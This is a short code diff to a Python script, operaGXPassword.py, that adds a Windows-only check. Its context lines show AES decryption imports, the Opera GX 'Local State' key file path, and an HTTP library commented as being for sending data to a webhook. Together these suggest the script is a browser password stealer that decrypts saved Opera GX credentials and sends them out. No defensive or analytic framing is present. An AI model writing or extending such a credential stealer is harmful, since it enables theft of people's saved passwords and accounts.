@@ -9,6 +9,12 @@ from Cryptodome.Cipher import AES
 import shutil
 import csv
 import requests  # For sending data to the webhook
+import platform
+import sys
+
+if platform.system() != "Windows":
+    sys.stderr.write("operaGXPassword.py can only run on Windows.\n")
+    sys.exit(0)
 
 # GLOBAL CONSTANT
 OPERA_GX_PATH_LOCAL_STATE = os.path.normpath(r"%APPDATA%\Opera Software\Opera GX Stable\Local State")
